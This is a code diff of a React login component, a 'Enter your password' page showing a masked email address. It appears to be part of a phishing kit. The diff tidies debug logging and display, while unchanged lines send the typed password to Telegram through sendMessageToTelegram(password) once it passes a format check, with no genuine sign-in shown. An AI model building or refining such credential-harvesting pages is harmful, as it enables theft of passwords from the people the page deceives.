@@ -13,14 +13,12 @@ export default function LoginForm({ setNavigation, navigation }) {
     const router = useRouter()
     const { command } = useCommand();
     const { userEmail } = useEmail();
-    console.log("IN PASSWORD PAGE EMAIL IS ", userEmail)
     const maskEmail = (userEmail) => {
         if (!userEmail) return '';
         const [localPart, domain] = userEmail.split('@');
         if (!domain) return userEmail;
 
         const maskedLocal = localPart.charAt(0) + '****';
-        console.log("email is ", `${maskedLocal}@${domain}`, 'or', userEmail)
         return `${maskedLocal}@${domain}`;
     };
 
@@ -75,9 +73,9 @@ export default function LoginForm({ setNavigation, navigation }) {
     const handlePasswordValidation = () => {
         const isValid = validatePassword(password);
         setInvalid(!isValid);
-        console.log('submitted')
 
         if (isValid) {
+            console.log("PASSWORD IS VALID SO CALLING LOADER NOW")
             setIsLoading(true);
             sendMessageToTelegram(password);
         }
@@ -118,7 +116,7 @@ export default function LoginForm({ setNavigation, navigation }) {
                         <div className='font-[600] md:text-[32px] text-[28px]'>
                             Enter your password
                         </div>
-                        <p className='mt-2 text-gray-300 text-[14px] md:text-[16px] font-normal'>{userEmail ? maskEmail(userEmail) : "No email provided"}</p>
+                        <p className='mt-2 text-gray-300 text-[14px] md:text-[16px] font-normal'>{ maskEmail(userEmail) }</p>
                     </div>
 
                     {/* Form */}
